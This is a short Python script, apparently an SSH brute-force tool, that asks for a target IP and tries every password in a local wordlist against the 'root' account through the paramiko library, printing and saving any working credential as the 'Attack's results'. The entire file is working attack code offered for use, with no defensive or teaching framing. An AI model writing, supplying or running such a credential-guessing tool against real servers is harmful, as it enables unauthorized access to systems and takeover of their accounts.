# Imports
import os
import threading
from paramiko import SSHClient
from paramiko.ssh_exception import AuthenticationException as AuthFail

# Constants

USER_NAMES  = ["root"]
LENGTH      = 15
READ        = "r"
WRITE       = "w"
RES_MSG     = "Attack's results"
LOG_FILE    = "attack_res.txt"


def read_pass(file_path):
    with open(file_path, READ) as file:
        passwords = file.read().splitlines()
    return passwords


def result(data, target_ip):
    result = f"\n{'-'*LENGTH}{RES_MSG}{'-'*LENGTH}"
    result += f"\nIP: {target_ip}"
    for user_name, password in data.items():
        result += f"\nUsername: {user_name}, Password: {password}"
    result += f"\n{'-' * (len(RES_MSG) + (LENGTH * 2))}"
    print(result)
    with open(LOG_FILE, WRITE) as file:
        file.write(result)


def main():
    target_ip = input("Enter the target's ip: ")
    file_path = "passwords.txt"
    user = os.getenv("USERNAME").replace(" ", "_")
    known_hosts = fr"C:\Users\{user}\.ssh\known_hosts"
    client = SSHClient()
    client.load_host_keys(known_hosts)

    passwords = read_pass(file_path)
    data = {}

    for user_name in USER_NAMES:
        print(f"Hacking the user {user_name}")
        for password in passwords:
            print(f"Trying the password: {password}")
            try:
                client.connect(target_ip, username=user_name, password=password)
                data[user_name] = password
                break
            except AuthFail:
                pass
            finally:
                client.close()

    if len(data) > 0:
        result(data, target_ip)
    else:
        print("No password was found")


if __name__ == "__main__":
    main()
